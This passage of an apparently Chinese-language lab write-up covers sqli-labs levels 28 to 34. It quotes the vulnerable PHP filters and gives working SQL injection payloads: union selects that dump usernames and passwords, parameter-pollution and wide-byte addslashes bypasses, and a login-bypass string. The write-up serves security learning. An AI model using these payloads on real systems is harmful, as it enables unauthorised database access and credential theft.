</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$id</span><span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/[\/\*]/&#39;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 过滤 - # 注释
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$id</span><span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/[--]/&#39;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$id</span><span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/[#]/&#39;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 过滤 空格 +
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$id</span><span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/[ +]/&#39;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span><span class="o">.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 过滤 union select /i 大小写都过滤
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$id</span><span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/union\s+select/i&#39;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="nv">$id</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>这里 union 和 select 这里可以使用双写嵌套绕过，过滤了注释的话 就使用闭合绕过，过滤了空格使用 Less-26 的编码绕过，OK分析完成后直接放完整的 payload 吧：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">999</span><span class="s1">&#39;)%a0union%a0select%a01,(select(group_concat(username,password%a0SEPARATOR%a00x3c62723e))from(users)),3||(&#39;</span><span class="mi">1</span><span class="s1">&#39;)=(&#39;</span><span class="mi">1</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="less-28a">Less-28a</h2>
<div class="table-wrapper"><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>联合、布尔盲注、延时盲注</td>
<td><code>id=('$id')</code></td>
</tr>
</tbody>
</table></div>
<p>比 Less-28 还少了几个过滤规则，可以直接使用 Less-28 的payload：</p>
<h2 id="less-29">Less-29</h2>
<p>这一题和注入天书里面描述的环境不太一样，还是具体分析看下代码吧。</p>
<ul>
<li><code>index.php</code></li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Php" data-lang="Php"><span class="line"><span class="cl"><span class="c1"># id = &#39;x&#39; 的拼接方式
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT * FROM users WHERE id=&#39;</span><span class="si">$id</span><span class="s2">&#39; LIMIT 0,1&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nx">查询到结果</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">    <span class="nx">输出查询的详细信息</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">    <span class="nx">print_r</span><span class="p">(</span><span class="nx">mysql_error</span><span class="p">());</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>从源码来看的话和前面的貌似没有啥区别，直接尝试联合注入看看吧：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">&#39; union select 1,(select(group_concat(username,password+SEPARATOR+0x3c62723e))from(users)),3 --+
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>这个 index.php 太简单了，不知道啥意思，下面直接重点来看 login.php 吧：</p>
<ul>
<li><code>login.php</code></li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Php" data-lang="Php"><span class="line"><span class="cl"><span class="c1"># 查询 query 的字符串
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$qs</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;QUERY_STRING&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 模拟 tomcat 的查询函数 处理一下
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$id1</span><span class="o">=</span><span class="nx">java_implimentation</span><span class="p">(</span><span class="nv">$qs</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$id</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 再次过滤检测
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">whitelist</span><span class="p">(</span><span class="nv">$id1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT * FROM users WHERE id=&#39;</span><span class="si">$id</span><span class="s2">&#39; LIMIT 0,1&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nx">查询到结果</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">    <span class="nx">输出查询的详细信息</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">    <span class="nx">print_r</span><span class="p">(</span><span class="nx">mysql_error</span><span class="p">());</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">function java_implimentation($query_string)
</span></span></span><span class="line"><span class="cl"><span class="err">{
</span></span></span><span class="line"><span class="cl"><span class="err">    $q_s = $query_string;
</span></span></span><span class="line"><span class="cl"><span class="err">    # &amp; 作为分隔符 分割字符串
</span></span></span><span class="line"><span class="cl"><span class="err">    $qs_array= explode(&#34;&amp;&#34;,$q_s);
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">    # 遍历 qs_array 数组
</span></span></span><span class="line"><span class="cl"><span class="err">    foreach($qs_array as $key =&gt; $value)
</span></span></span><span class="line"><span class="cl"><span class="err">    {    
</span></span></span><span class="line"><span class="cl"><span class="err">        $val=substr($value,0,2);
</span></span></span><span class="line"><span class="cl"><span class="err">        # 如果数组前两位是 id 的话
</span></span></span><span class="line"><span class="cl"><span class="err">        if($val==&#34;id&#34;)
</span></span></span><span class="line"><span class="cl"><span class="err">        {    
</span></span></span><span class="line"><span class="cl"><span class="err">            # 截取 $value 的3-30 的字符串 作为 id 的值 
</span></span></span><span class="line"><span class="cl"><span class="err">            $id_value=substr($value,3,30); 
</span></span></span><span class="line"><span class="cl"><span class="err">            return $id_value;
</span></span></span><span class="line"><span class="cl"><span class="err">            echo &#34;&lt;br&gt;&#34;;
</span></span></span><span class="line"><span class="cl"><span class="err">            break;
</span></span></span><span class="line"><span class="cl"><span class="err">        }
</span></span></span><span class="line"><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="cl"><span class="err">}
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">function whitelist($input)
</span></span></span><span class="line"><span class="cl"><span class="err">{
</span></span></span><span class="line"><span class="cl"><span class="err">    # 过滤规则 检测数字
</span></span></span><span class="line"><span class="cl"><span class="err">    $match = preg_match(&#34;/^\d+$/&#34;, $input);
</span></span></span><span class="line"><span class="cl"><span class="err">    if 不符合规则：
</span></span></span><span class="line"><span class="cl"><span class="err">        header(&#39;Location: hacked.php&#39;);
</span></span></span><span class="line"><span class="cl"><span class="err">}
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>从代码中还是很容易发现问题的，关键问题出在下面的地方：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Php" data-lang="Php"><span class="line"><span class="cl"><span class="nv">$id1</span><span class="o">=</span><span class="nx">java_implimentation</span><span class="p">(</span><span class="nv">$qs</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="nx">whitelist</span><span class="p">(</span><span class="nv">$id1</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>whitelist</code> 过滤是比较严格的，如果 id 不是数字的话就会直接重定向到 <code>hacked.php</code>，这里是没毛病的。那么问题出在了这里函数<code>$id1=java_implimentation($qs);</code></p>
<p>因为 return 表示了函数的结束运行，所以这个函数捕捉到 id 的时候就会返回 <code>return $id_value</code>，这样就导致了 用户加入构造两组 id 的话，那么后面的 id 就会绕过函数检测。</p>
<p>假设用户输入这样的语句：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Php" data-lang="Php"><span class="line"><span class="cl"><span class="nx">index</span><span class="o">.</span><span class="nx">php</span><span class="o">?</span><span class="nx">id</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="nx">id</span><span class="o">=</span><span class="mi">2</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Apache PHP 会解析最后一个参数</p>
<p>Tomcat JSP 会解析第一个参数</p>
<p>知道这个原理的话后面尝试直接注入吧：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">login</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">2</span><span class="o">&amp;</span><span class="n">id</span><span class="o">=-</span><span class="mi">2</span><span class="s1">&#39; union select 1,(select group_concat(username,password SEPARATOR 0x3c62723e) from users),3 --+
</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="less-30">Less-30</h2>
<div class="table-wrapper"><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>联合、报错、布尔盲注、延时盲注</td>
<td><code>id=&quot;$id&quot;</code></td>
</tr>
</tbody>
</table></div>
<p>和 Less-29 相比没有啥本质变化，只是拼接方式不一样。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">login</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">2</span><span class="o">&amp;</span><span class="n">id</span><span class="o">=-</span><span class="mi">2</span><span class="s2">&#34; union select 1,(select group_concat(username,password SEPARATOR 0x3c62723e) from users),3 --+
</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="less-31">Less-31</h2>
<div class="table-wrapper"><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>联合、报错、布尔盲注、延时盲注</td>
<td><code>id=（&quot;$id&quot;）</code></td>
</tr>
</tbody>
</table></div>
<p>和 Less-29 相比没有啥本质变化，只是拼接方式不一样。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">login</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">2</span><span class="o">&amp;</span><span class="n">id</span><span class="o">=-</span><span class="mi">2</span><span class="s2">&#34;) union select 1,(select group_concat(username,password SEPARATOR 0x3c62723e) from users),3 --+
</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="less-32宽字节注入">Less-32(宽字节注入)</h2>
<div class="table-wrapper"><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>联合、报错、布尔盲注、延时盲注</td>
<td><code>id='$id'</code></td>
</tr>
</tbody>
</table></div>
<p>考察 Bypass addslashes()，关键的防护代码如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Php" data-lang="Php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl"><span class="nv">$id</span><span class="o">=</span><span class="nx">check_addslashes</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 在&#39; &#34; \ 等敏感字符前面添加反斜杠
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">function</span> <span class="nf">check_addslashes</span><span class="p">(</span><span class="nv">$string</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>        <span class="c1"># \ 转换为 \\
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$string</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="o">.</span> <span class="nx">preg_quote</span><span class="p">(</span><span class="s1">&#39;\\&#39;</span><span class="p">)</span> <span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\\\\\\</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>          <span class="nx">将</span>       <span class="c1"># 将 &#39; 转为\&#34;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$string</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/\&#39;/i&#39;</span><span class="p">,</span> <span class="s1">&#39;\\\&#39;&#39;</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>   
</span></span><span class="line"><span class="cl">      <span class="c1"># 将 &#34; 转为\&#34;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$string</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/\&#34;/&#39;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\\\&#34;</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>                                
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$string</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>宽字节注入原理</strong></p>
<p>MySQL 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如 <code>%aa%5c</code> 就是一个 汉字。因为过滤方法主要就是在敏感字符前面添加 反斜杠 <code>\</code>，所以这里想办法干掉反斜杠即可。</p>
<p>1、<code>%df</code> 吃掉 <code>\</code></p>
<p>具体的原因是 <code>urlencode(\') = %5c%27</code>，我们在<code>%5c%27</code> 前面添加<code>%df</code>，形 成<code>%df%5c%27</code>，MySQL 在 GBK 编码方式的时候会将两个字节当做一个汉字，这个时候就把<code>%df%5c</code> 当做是一个汉字，<code>%27</code> 则作为一个单独的符号在外面，同时也就达到了我们的目的。</p>
<p>2、将 <code>\'</code> 中的 <code>\</code> 过滤掉</p>
<p>例如可以构造 <code>%5c%5c%27</code> 的情况，后面的<code>%5c</code>会被前面的<code>%5c</code> 给注释掉。这也是 bypass 的一种方法。</p>
<p>本关卡采用第一种 %df 宽字节注入来吃掉反斜杠，下面直接丢 payload 吧：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="o">%</span><span class="n">df</span><span class="s1">&#39; union select 1,(select group_concat(username,password SEPARATOR 0x3c62723e) from users),3 --+
</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="less-33">Less-33</h2>
<div class="table-wrapper"><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>联合、报错、布尔盲注、延时盲注</td>
<td><code>id='$id'</code></td>
</tr>
</tbody>
</table></div>
<p>拼接方式也是一样的，过滤方法细节有点变化，具体如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Php" data-lang="Php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">check_addslashes</span><span class="p">(</span><span class="nv">$string</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$string</span><span class="o">=</span> <span class="nx">addslashes</span><span class="p">(</span><span class="nv">$string</span><span class="p">);</span>    
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$string</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>addslashes()</code> 函数返回在预定义字符之前添加反斜杠的字符串。</p>
<div class="table-wrapper"><table>
<thead>
<tr>
<th>预定义字符</th>
<th>转义后</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>\</code></td>
<td><code>\\</code></td>
</tr>
<tr>
<td><code>'</code></td>
<td><code>\'</code></td>
</tr>
<tr>
<td><code>&quot;</code></td>
<td><code>\&quot;</code></td>
</tr>
</tbody>
</table></div>
<p>该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串，和 Less-32 的函数功能是差不的，依旧可以使用宽字节进行注入。</p>
<blockquote>
<p>注入天书：使用 addslashes(),我们需要将 mysql_query 设置为 binary 的方式，才能防御此漏洞</p>
</blockquote>
<h2 id="less-34">Less-34</h2>
<div class="table-wrapper"><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>POST</td>
<td>联合、报错、布尔盲注、延时盲注</td>
<td><code>username='$uname'</code></td>
</tr>
</tbody>
</table></div>
<p>过滤方法依然和 Less-33 一致：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$uname</span> <span class="o">=</span> <span class="nx">addslashes</span><span class="p">(</span><span class="nv">$uname1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$passwd</span><span class="o">=</span> <span class="nx">addslashes</span><span class="p">(</span><span class="nv">$passwd1</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>只是由 GET 型变成了 POST 型，所以下面直接丢 POST 的数据包 payload 了：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">uname</span><span class="o">=</span><span class="k">admin</span><span class="o">%</span><span class="n">df</span><span class="s1">&#39; union select 1,(select group_concat(username,password SEPARATOR 0x3c62723e) from users)#&amp;passwd=admin
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>MySQL 注入天书这里介绍了一个新的方法</p>
<p>将 utf-8 转换为 utf-16 或 utf-32，例如将 <code>'</code> 转为 utf-16 为<code>�</code></p>
<p>我们就 可以利用这个方式进行尝试，可以使用 Linux 自带的 iconv 命令进行 UTF 的编码转换：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Bash" data-lang="Bash"><span class="line"><span class="cl">➜  ~ <span class="nb">echo</span> <span class="se">\&#39;</span><span class="p">|</span>iconv -f utf-8 -t utf-16
</span></span><span class="line"><span class="cl">��<span class="s1">&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">➜  ~ echo \&#39;</span><span class="p">|</span>iconv -f utf-8 -t utf-32
</span></span><span class="line"><span class="cl">��<span class="err">&#39;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>首先尝试一个经典的万能密码：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">uname=�&#39; or 1#&amp;passwd=
</span></span></code></pre></td></tr></table>
</div>
</div><p>为什么这个万能密码可以生效呢，因为拼接到 SQL 中是如下的效果：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Sql" data-lang="Sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="s1">&#39;�&#39;</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="mi">1</span><span class="o">#</span><span class="k">and</span><span class="w"> </span><span class="n">password</span><span class="o">=</span><span class="s1">&#39;$passwd&#39;</span><span class="w"> </span><span class="k">LIMIT</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p><code>or 1</code> 是一个永真的条件，不论 select 选择出的内容是什么。<code>or 1</code> 之后时钟都是 1，下面是控制后台的演示：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Bash" data-lang="Bash"><span class="line"><span class="cl"><span class="c1"># where username = &#39;x&#39; or 1</span>
</span></span><span class="line"><span class="cl">mysql&gt;  <span class="k">select</span> * from users where <span class="nv">username</span> <span class="o">=</span> <span class="s1">&#39;x&#39;</span> or 1<span class="p">;</span>
</span></span><span class="line"><span class="cl">+----+------------+----------+
</span></span><span class="line"><span class="cl"><span class="p">|</span> id <span class="p">|</span> username   <span class="p">|</span> password <span class="p">|</span>
</span></span><span class="line"><span class="cl">+----+------------+----------+
</span></span><span class="line"><span class="cl"><span class="p">|</span>  <span class="m">1</span> <span class="p">|</span> Dumb       <span class="p">|</span> <span class="m">0</span>        <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>  <span class="m">2</span> <span class="p">|</span> Angelina   <span class="p">|</span> <span class="m">0</span>        <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>  <span class="m">3</span> <span class="p">|</span> Dummy      <span class="p">|</span> <span class="m">0</span>        <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>  <span class="m">4</span> <span class="p">|</span> secure     <span class="p">|</span> <span class="m">0</span>        <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>  <span class="m">5</span> <span class="p">|</span> stupid     <span class="p">|</span> <span class="m">0</span>        <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>  <span class="m">6</span> <span class="p">|</span> superman   <span class="p">|</span> <span class="m">0</span>        <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>  <span class="m">7</span> <span class="p">|</span> batman     <span class="p">|</span> <span class="m">0</span>        <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>  <span class="m">8</span> <span class="p">|</span> admin      <span class="p">|</span> <span class="m">1234</span>     <span class="p">|</span>
